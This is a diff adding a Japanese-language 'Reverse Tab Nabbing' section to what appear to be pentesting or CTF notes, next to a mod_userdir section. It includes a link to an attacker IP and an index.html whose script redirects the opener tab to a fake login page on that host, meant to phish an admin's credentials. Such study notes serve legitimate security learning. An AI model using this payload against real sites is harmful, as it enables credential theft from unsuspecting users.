@@ -306,6 +306,34 @@ $ python3 -m pip install -r requirements.txt
 
 ## その他
 
+### Reverse Tab Nabbing
+
+https://book.hacktricks.wiki/en/pentesting-web/reverse-tab-nabbing.html
+
+target="_blank" が指定されており、かつ rel="noopener" または rel="noreferrer" が指定されていない場合、Reverse Tab Nabbing 攻撃が成立する可能性がある。
+
+```html
+<a href='http://10.2.22.182:8000/index.html' target='_blank' >Here</a>
+```
+
+1. 現在のタブを開いた元のタブのLocationを（2で作成するページに）変更するHTMLページを用意する
+2. 攻撃対象サイトのログイン画面に似せたログインページを用意する
+3. adminがだまされてログイン情報を入力したら、その情報が攻撃者に送信される
+
+### アクセスさせるページ index.html
+
+```html
+<!DOCTYPE html>
+<html>
+ <body>
+  Welcome to my blog!
+  <script>
+  window.opener.location = "http://10.2.22.182:8000/login.php";
+  </script>
+ </body>
+</html>
+```
+
 ### mod_userdir モジュール
 
 mod_userdir モジュールが有効になっていて、/home/foo/bar.txt というパスが存在することを知っている場合、
